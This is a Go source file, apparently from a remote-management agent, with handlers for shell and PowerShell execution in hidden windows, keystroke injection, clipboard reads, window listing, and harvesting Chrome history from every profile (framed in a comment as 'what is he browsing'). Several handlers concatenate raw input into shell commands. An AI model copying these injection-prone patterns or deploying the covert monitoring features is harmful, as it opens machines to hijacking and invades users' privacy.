		_ = os.Remove(dst)
		return "", fmt.Errorf("copy-item: file exceeds 256MB cap")
	}
	return "", nil
}

func moveItem(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: move-item <src>|<dst>")
	}
	src := strings.TrimSpace(parts[0])
	dst := strings.TrimSpace(parts[1])
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return "", err
	}
	return "", os.Rename(src, dst)
}

func renameItem(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: rename-item <path>|<newName>")
	}
	p := strings.TrimSpace(parts[0])
	n := strings.TrimSpace(parts[1])
	return "", os.Rename(p, filepath.Join(filepath.Dir(p), n))
}

func fileInfo(p string) (string, error) {
	if p == "" {
		return "", fmt.Errorf("path required")
	}
	info, err := os.Stat(p)
	if err != nil {
		return "", err
	}
	j, _ := json.MarshalIndent(map[string]interface{}{
		"name": info.Name(), "size": info.Size(), "isDir": info.IsDir(), "mod": info.ModTime(), "mode": info.Mode().String(),
	}, "", "  ")
	return string(j), nil
}

func fileHash(p string) (string, error) {
	f, err := os.Open(p)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

func dirSize(p string) (string, error) {
	if p == "" {
		p = "."
	}
	var total int64
	files := 0
	truncated := false
	err := filepath.Walk(p, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip unreadable entries
		}
		if !info.IsDir() {
			total += info.Size()
			files++
			if files > 100000 {
				truncated = true
				return filepath.SkipAll
			}
		}
		return nil
	})
	if err != nil {
		return "", err
	}
	if truncated {
		return fmt.Sprintf("%d bytes (100k+ files, truncated)", total), nil
	}
	return fmt.Sprintf("%d bytes (%d files)", total, files), nil
}

func searchFiles(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: search-files <path>|<pattern>")
	}
	root := strings.TrimSpace(parts[0])
	pat := strings.TrimSpace(parts[1])
	var matches []string
	_ = filepath.Walk(root, func(p string, _ os.FileInfo, _ error) error {
		if len(matches) >= 100 {
			return filepath.SkipAll
		}
		if matched, _ := filepath.Match(pat, filepath.Base(p)); matched {
			matches = append(matches, p)
		}
		return nil
	})
	if len(matches) >= 100 {
		return strings.Join(matches, "\n") + "\n... truncated at 100", nil
	}
	return strings.Join(matches, "\n"), nil
}

func shellExec(cmdStr string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = hideWindow(exec.CommandContext(ctx, "cmd.exe", "/c", cmdStr))
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	out = truncateOut(out)
	if ctx.Err() == context.DeadlineExceeded {
		return string(out), fmt.Errorf("timed out after %s", shellTimeout)
	}
	if err != nil {
		return string(out), fmt.Errorf("%v", err)
	}
	return string(out), nil
}

func shellExecPS(script string) (string, error) {
	return execPS(script)
}

func launchApp(p string) (string, error) {
	if p = strings.TrimSpace(p); p == "" {
		return "", fmt.Errorf("path required")
	}
	if runtime.GOOS == "windows" {
		// Direct exec handles spaced paths; fall back to the shell
		// association handler for documents/URLs. Launchers themselves
		// never get a console (the launched GUI app shows its own UI).
		if err := hideWindow(exec.Command(p)).Start(); err == nil {
			return "launched " + p, nil
		}
		if err := hideWindow(exec.Command("rundll32", "url.dll,FileProtocolHandler", p)).Start(); err != nil {
			return "", err
		}
		return "launched " + p, nil
	}
	if err := exec.Command("sh", "-c", p+" &").Start(); err != nil {
		return "", err
	}
	return "launched " + p, nil
}

func openURL(u string) (string, error) {
	if u = strings.TrimSpace(u); u == "" {
		return "", fmt.Errorf("url required")
	}
	if runtime.GOOS == "windows" {
		// Deterministic Chrome target: "open-url chrome <url>" launches
		// chrome.exe explicitly instead of the default-browser lottery
		// (rundll32 FileProtocolHandler mishandles chrome:// URLs when
		// Chrome isn't default). Falls back to shell association when
		// chrome.exe isn't on PATH (per-user installs).
		if strings.HasPrefix(strings.ToLower(u), "chrome ") {
			rest := strings.TrimSpace(u[len("chrome "):])
			if rest == "" {
				return "", fmt.Errorf("url required")
			}
			if err := hideWindow(exec.Command("chrome.exe", rest)).Start(); err != nil {
				if err2 := hideWindow(exec.Command("rundll32", "url.dll,FileProtocolHandler", rest)).Start(); err2 != nil {
					return "", err2
				}
			}
			return "opened " + rest + " in chrome", nil
		}
		if err := hideWindow(exec.Command("rundll32", "url.dll,FileProtocolHandler", u)).Start(); err != nil {
			return "", err
		}
		return "opened " + u, nil
	}
	if err := exec.Command("xdg-open", u).Start(); err != nil {
		return "", err
	}
	return "opened " + u, nil
}

func getIPAddresses() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", err
	}
	var out []string
	for _, a := range addrs {
		out = append(out, a.String())
	}
	return strings.Join(out, "\n"), nil
}

func getNetworkInfo() (string, error) {
	if runtime.GOOS == "windows" {
		return shellExec("ipconfig /all")
	}
	return shellExec("ifconfig -a || ip addr")
}

func getPublicIP() (string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b), nil
}

func resolveDNS(h string) (string, error) {
	if h == "" {
		return "", fmt.Errorf("host required")
	}
	ips, err := net.LookupIP(h)
	if err != nil {
		return "", err
	}
	var out []string
	for _, ip := range ips {
		out = append(out, ip.String())
	}
	return strings.Join(out, "\n"), nil
}

func testConnection(h string) (string, error) {
	if h == "" {
		return "", fmt.Errorf("host required")
	}
	if runtime.GOOS == "windows" {
		return shellExec("ping -n 4 " + h)
	}
	return shellExec("ping -c 4 " + h)
}

func checkPort(arg string) (string, error) {
	parts := strings.Fields(arg)
	if len(parts) < 2 {
		return "", fmt.Errorf("usage: check-port <host> <port>")
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(parts[0], parts[1]), 3*time.Second)
	if err != nil {
		return "closed: " + err.Error(), nil
	}
	conn.Close()
	return "open", nil
}

func sendText(t string) (string, error) {
	if strings.TrimSpace(t) == "" {
		return "", fmt.Errorf("usage: send-text <text>")
	}
	if runtime.GOOS == "windows" {
		// Native first: one SendInput call (~1ms). PowerShell spawn below
		// (~300-1000ms) is the fallback, not the default.
		if err := sendTextNative(t); err == nil {
			return "", nil
		}
		// Escape SendKeys special chars (+ ^ % ~ ( ) [ ] { }) with braces.
		var b strings.Builder
		for _, r := range t {
			switch r {
			case '+', '^', '%', '~', '(', ')', '[', ']', '{', '}':
				b.WriteString("{" + string(r) + "}")
			case '"':
				b.WriteString("\"\"")
			default:
				b.WriteRune(r)
			}
		}
		script := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("%s")`, b.String())
		return execPS(script)
	}
	return "", fmt.Errorf("not supported on %s", runtime.GOOS)
}

func keyPress(key string) (string, error) {
	if key = strings.TrimSpace(key); key == "" {
		return "", fmt.Errorf("usage: key-press <key>  (e.g. {ENTER}, {TAB}, {F5}, ^s)")
	}
	if runtime.GOOS == "windows" {
		if err := keyPressNative(key); err == nil {
			return "key " + key + " sent", nil
		}
		script := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("%s")`, strings.ReplaceAll(key, `"`, `""`))
		if out, err := execPS(script); err != nil {
			return out, err
		}
		return "key " + key + " sent", nil
	}
	return "", fmt.Errorf("not supported on %s", runtime.GOOS)
}

func lockScreen() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	// Start (not CombinedOutput): it returns immediately.
	if err := hideWindow(exec.Command("rundll32.exe", "user32.dll,LockWorkStation")).Start(); err != nil {
		return "", err
	}
	return "screen locked", nil
}

func minimizeAll() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	return execPS(`(New-Object -ComObject Shell.Application).MinimizeAll()`)
}

func setWallpaper(p string) (string, error) {
	if p = strings.TrimSpace(p); p == "" {
		return "", fmt.Errorf("usage: set-wallpaper <path>")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	abs, err := filepath.Abs(p)
	if err != nil {
		abs = p
	}
	if _, err := os.Stat(abs); err != nil {
		return "", err
	}
	// SPI_SYSTEMDESKTOPIMAGE (20): set + update. C# helper prints the
	// return (1/0) + last Win32 error so a silent wallpaper failure is
	// no longer indistinguishable from success. SPIF_UPDATEINIFILE(1) |
	// SPIF_SENDCHANGE(2). Retry once on the same abs path if rc==0.
	script := fmt.Sprintf(`Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class RmmWall {
  [DllImport("user32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  [DllImport("kernel32.dll")] public static extern int GetLastError();
}
'@; $rc=[RmmWall]::SystemParametersInfo(20,0,%s,3); if(-not $rc){ $e=[Runtime.InteropServices.Marshal]::GetLastWin32Error(); "WALLPAPER-FAIL code=$e" } else { "wallpaper set to %s" }`, psQuote(abs), psQuote(abs))
	out, err := execPS(script)
	if err != nil {
		return "", err
	}
	if strings.Contains(out, "WALLPAPER-FAIL") {
		return "", fmt.Errorf("%s", strings.TrimSpace(out))
	}
	return strings.TrimSpace(out), nil
}

func setBrightness(arg string) (string, error) {
	var pct int
	if _, err := fmt.Sscanf(strings.TrimSpace(strings.TrimSuffix(arg, "%")), "%d", &pct); err != nil || pct < 0 || pct > 100 {
		return "", fmt.Errorf("usage: set-brightness <0-100>")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	return execPS(fmt.Sprintf(`(Get-CimInstance -Namespace root/wmi -ClassName WmiMonitorBrightnessMethods).WmiSetBrightness(1, %d)`, pct))
}

func clipboardGet() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-Clipboard")
	}
	return "", fmt.Errorf("not supported")
}

func clipboardSet(t string) (string, error) {
	if runtime.GOOS == "windows" {
		return execPS(fmt.Sprintf("Set-Clipboard -Value \"%s\"", strings.ReplaceAll(t, "\"", "`\"")))
	}
	return "", fmt.Errorf("not supported")
}

func getActiveWindow() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object ProcessName,MainWindowTitle | Format-Table -AutoSize")
	}
	return "", fmt.Errorf("not supported")
}

// chromeTabs lists Chrome windows — one title per window, which is that
// window's active tab — via the same MainWindowTitle source as
// getActiveWindow. Background tabs need a UIAutomation walk (v2); this
// answers "what is he browsing" today. Numbered agent-side so voice
// follow-ups ("the second one") and humans share the numbering.
func chromeTabs() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("chrome tabs listing is windows-only")
	}
	out, err := execPS(`Get-Process chrome -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -ExpandProperty MainWindowTitle`)
	if err != nil {
		return "", err
	}
	return formatChromeTabs(out), nil
}

func formatChromeTabs(raw string) string {
	var titles []string
	for _, ln := range strings.Split(raw, "\n") {
		if t := strings.TrimSpace(strings.TrimRight(ln, "\r")); t != "" {
			titles = append(titles, t)
		}
	}
	if len(titles) == 0 {
		return "no Chrome windows open"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "%d Chrome window(s):\n", len(titles))
	for i, t := range titles {
		fmt.Fprintf(&b, "%d. %s\n", i+1, t)
	}
	return strings.TrimRight(b.String(), "\n")
}

// chromeProfile is one Chrome profile directory with its display identity.
type chromeProfile struct {
	dir     string // "Default", "Profile 1", ...
	name    string // display name from Local State ("Personal")
	email   string // signed-in account
	entries int    // rows pulled (filled by query, for follow-ups)
}

// parseHistoryArgs splits "get-chrome-history [N] [profile-ref]".
func parseHistoryArgs(args string) (n int, ref string) {
	n = 20
	fields := strings.Fields(args)
	if len(fields) > 0 {
		if v, err := strconv.Atoi(fields[0]); err == nil {
			n = v
			fields = fields[1:]
		}
	}
	if n < 1 {
		n = 1
	}
	if n > 50 {
		n = 50
	}
	return n, strings.Join(fields, " ")
}

// chromeUserData resolves Chrome's profile home. Chrome-only by design
// (Edge/Brave keep the same layout but mixing browsers misattributes).
func chromeUserData() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("chrome history is windows-only")
	}
	base := os.Getenv("LOCALAPPDATA")
	if base == "" {
		return "", fmt.Errorf("LOCALAPPDATA unset")
	}
	dir := filepath.Join(base, "Google", "Chrome", "User Data")
	if st, err := os.Stat(dir); err != nil || !st.IsDir() {
		return "", fmt.Errorf("no Chrome profile home")
	}
	return dir, nil
}

// chromeProfileName maps a profile dir to its display identity from Local
// State (info_cache), falling back to the dir name. Pure over file bytes.
func chromeProfileName(localState []byte, dir string) (name, email string) {
	var ls struct {
		InfoCache map[string]struct {
			Name     string `json:"name"`
			UserName string `json:"user_name"`
		} `json:"info_cache"`
	}
	if err := json.Unmarshal(localState, &ls); err != nil {
		return dir, ""
	}
	if info, ok := ls.InfoCache[dir]; ok {
		if info.Name == "" {
			info.Name = dir
		}
		return info.Name, info.UserName
	}
	return dir, ""
}

// listChromeProfiles enumerates profile dirs holding a History file.
// Order is stable: Default first, then the rest sorted.
func listChromeProfiles(userData string) []chromeProfile {
	entries, err := os.ReadDir(userData)
	if err != nil {
		return nil
	}
	var raw []byte
	if b, err := os.ReadFile(filepath.Join(userData, "Local State")); err == nil {
		raw = b
	}
	var dirs []string
	for _, e := range entries {
		if e.IsDir() {
			dirs = append(dirs, e.Name())
		}
	}
	hasHistory := func(dir string) bool {
		st, err := os.Stat(filepath.Join(userData, dir, "History"))
		return err == nil && !st.IsDir()
	}
	return buildProfileList(dirs, hasHistory, raw)
}

// buildProfileList is the pure core of listChromeProfiles: stable order
// (Default, then sorted Profile N), History-gated, names from Local State.
func buildProfileList(dirs []string, hasHistory func(string) bool, localState []byte) []chromeProfile {
	var out []chromeProfile
	push := func(dir string) {
		if !hasHistory(dir) {
			return
		}
		name, email := chromeProfileName(localState, dir)
		out = append(out, chromeProfile{dir: dir, name: name, email: email})
	}
	push("Default")
	var rest []string
	for _, d := range dirs {
		if d != "Default" && strings.HasPrefix(d, "Profile ") {
			rest = append(rest, d)
		}
	}
	sort.Strings(rest)
	for _, d := range rest {
		push(d)
	}
	return out
}

// matchChromeProfile resolves a reference: #N (1-based discovery order),
// dir name, display name, or email local-part — case-insensitive.
func matchChromeProfile(profiles []chromeProfile, ref string) (chromeProfile, bool) {
	ref = strings.ToLower(strings.TrimSpace(strings.TrimPrefix(ref, "#")))
	if ref == "" {
		return chromeProfile{}, false
	}
	var n int
	if _, err := fmt.Sscanf(ref, "%d", &n); err == nil && n >= 1 && n <= len(profiles) {
		return profiles[n-1], true
	}
	for _, p := range profiles {
		if strings.EqualFold(p.dir, ref) || strings.EqualFold(p.name, ref) || strings.EqualFold(p.email, ref) {
			return p, true
		}
	}
	for _, p := range profiles {
		lr, ld, ln, le := strings.ToLower(ref), strings.ToLower(p.dir), strings.ToLower(p.name), strings.ToLower(p.email)
		if strings.Contains(ld, lr) || strings.Contains(ln, lr) {
			return p, true
		}
		if i := strings.Index(le, "@"); i > 0 && strings.EqualFold(le[:i], lr) {
			return p, true
		}
	}
	return chromeProfile{}, false
}

func formatProfileList(profiles []chromeProfile) string {
	var b strings.Builder
	b.WriteString("profiles:\n")
	for i, p := range profiles {
		label := p.name
		if p.email != "" && !strings.EqualFold(p.email, p.name) {
			label += " (" + p.email + ")"
		}
		fmt.Fprintf(&b, "%d. %s [%s]\n", i+1, label, p.dir)
	}
	return strings.TrimRight(b.String(), "\n")
}

// formatHistoryRows renders sqlite rows "date|url|title" as numbered lines
// ("N. date | title | url") — the shape ordinal-open parses back.
func formatHistoryRows(raw string, n int) string {
	var rows []string
	for _, ln := range strings.Split(raw, "\n") {
		ln = strings.TrimSpace(strings.TrimRight(ln, "\r"))
		if ln == "" {
			continue
		}
		parts := strings.SplitN(ln, "|", 3)
		for len(parts) < 3 {
			parts = append(parts, "")
		}
		date, url, title := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2])
		if len(url) > 160 {
			url = url[:160]
		}
		rows = append(rows, fmt.Sprintf("%s | %s | %s", date, title, url))
		if len(rows) >= n {
			break
		}
	}
	if len(rows) == 0 {
		return "no history rows"
	}
	var b strings.Builder
	for i, r := range rows {
		fmt.Fprintf(&b, "%d. %s\n", i+1, r)
	}
	return strings.TrimRight(b.String(), "\n")
}

// sqlite3Path finds the bundled helper next to our own binary (installed
// by the same payload), falling back to PATH.
func sqlite3Path() string {
	if exe, err := os.Executable(); err == nil {
		if p := filepath.Join(filepath.Dir(exe), "sqlite3.exe"); fileExists(p) {
			return p
		}
	}
	if p, err := exec.LookPath("sqlite3"); err == nil {
		return p
	}
	if p, err := exec.LookPath("sqlite3.exe"); err == nil {
		return p
	}
	return ""
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

// chromeHistory implements get-chrome-history [N] [profile]: numbered recent
// rows, multi-profile disambiguation, temp-copy hygiene. Chrome holds its
// History open (and WAL-mode), so we copy History+wal+shm aside and query
// the copy — never the live files, never a browser restart.
func chromeHistory(args string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("chrome history is windows-only")
	}
	n, ref := parseHistoryArgs(args)
	userData, err := chromeUserData()
	if err != nil {
		return "", err
	}
	profiles := listChromeProfiles(userData)
	if len(profiles) == 0 {
		return "", fmt.Errorf("no Chrome history found")
	}
	var prof chromeProfile
	if len(profiles) == 1 && ref == "" {
		prof = profiles[0]
	} else {
		var ok bool
		if ref == "" {
			return formatProfileList(profiles) + "\nwhich profile? get-chrome-history [N] <name|#N>", nil
		}
		if prof, ok = matchChromeProfile(profiles, ref); !ok {
			return "", fmt.Errorf("no profile matching %q", ref)
		}
	}
	sqlite := sqlite3Path()
	if sqlite == "" {
		return "", fmt.Errorf("history helper missing (sqlite3.exe) — reinstall the agent")
	}
	tmp, err := os.MkdirTemp("", "rmmhist")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmp)
	srcDir := filepath.Join(userData, prof.dir)
	for _, f := range []string{"History", "History-wal", "History-shm"} {
		if b, err := os.ReadFile(filepath.Join(srcDir, f)); err == nil {
			_ = os.WriteFile(filepath.Join(tmp, f), b, 0600)
		}
	}
	q := fmt.Sprintf("SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),url,substr(ifnull(title,''),1,80) FROM urls ORDER BY last_visit_time DESC LIMIT %d;", n)
	cmd := exec.Command(sqlite, filepath.Join(tmp, "History"), q)
	hideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("history query failed: %v", err)
	}
	rows := formatHistoryRows(string(out), n)
	if rows == "no history rows" {
		return "no history rows", nil
	}
	disp := prof.name
	if disp == "" {
		disp = prof.dir
	}
	return disp + ":\n" + rows, nil
}

func getServices() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-Service | Select-Object Name,Status,DisplayName | Format-Table -AutoSize")
	}
	return shellExec("systemctl list-units --type=service --no-pager | head -100")
}

func getProcesses() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-Process | Select-Object ProcessName,Id,CPU,WorkingSet | Sort-Object CPU -Descending | Select-Object -First 30 | Format-Table -AutoSize")
	}
	return shellExec("ps aux | head -50")
}

func getInstalledPrograms() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName,DisplayVersion,Publisher | Where-Object DisplayName -ne $null | Format-Table -AutoSize")
	}
	return shellExec("dpkg -l | head -100")
}

func shutdownRestart(arg string) (string, error) {
	arg = strings.ToLower(strings.TrimSpace(arg))
	switch arg {
	case "shutdown":
		if runtime.GOOS == "windows" {
			return shellExec("shutdown /s /t 0")
		}
		return shellExec("shutdown -h now")
	case "restart":
		if runtime.GOOS == "windows" {
			return shellExec("shutdown /r /t 0")
		}
		return shellExec("shutdown -r now")
	case "logoff":
		if runtime.GOOS == "windows" {
			return shellExec("shutdown /l")
		}
		return "", fmt.Errorf("not supported")
	case "sleep":
		if runtime.GOOS == "windows" {
			return shellExec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
		}
		return shellExec("systemctl suspend")
	case "hibernate":
		if runtime.GOOS == "windows" {
			return shellExec("shutdown /h")
		}
		return "", fmt.Errorf("not supported")
	default:
		return "", fmt.Errorf("usage: shutdown-restart <shutdown|restart|logoff|sleep|hibernate>")
	}
}

func generatePassword() (string, error) {
	b := make([]byte, 12)
	if _, err := rand.Read(b); err != nil {
		for i := range b {
			b[i] = byte(time.Now().UnixNano() >> (i * 2) & 0xFF)
		}
	}
	return hex.EncodeToString(b), nil
}

func generateUUID() (string, error) {
	// Pure Go UUIDv4 (no powershell spawn — was slow and flaky).
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("rand: %w", err)
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16]), nil
}

func encodeBase64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func decodeBase64(s string) (string, error) {
	if b, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s)); err == nil {
		return string(b), nil
	}
	if b, err := hex.DecodeString(strings.TrimSpace(s)); err == nil {
		return string(b), nil
	}
	return "", fmt.Errorf("invalid base64/hex")
}
